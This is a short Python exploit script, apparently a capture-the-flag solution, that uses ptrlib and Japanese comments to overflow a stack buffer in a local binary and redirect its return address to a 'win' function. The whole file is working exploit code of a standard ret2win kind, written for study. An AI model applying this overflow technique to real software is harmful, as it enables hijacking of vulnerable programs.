from ptrlib import *


def main():
    elf = ELF("./chall")
    proc = Process("./chall")

    # -no-pie なので関数のアドレスがすぐわかる
    addr_win = elf.symbol("win")

    # buf を埋めたあと、saved rip を win に書き換えれば良い
    buf_size = 30
    stack_size = 0x20

    payload = b"A" * (buf_size - 1) + b"\0"  # buf を埋める
    payload += b"B" * (stack_size - buf_size)  # 余りを埋める
    payload += b"0" * 0x8  # saved rbp を埋める
    payload += p64(
        addr_win + 1
    )  # return address を win 関数のアドレスに書き換える(movaps で死ぬので push rbp を飛ばす)

    proc.sendline(payload)
    proc.interactive()
    return


if __name__ == "__main__":
    main()
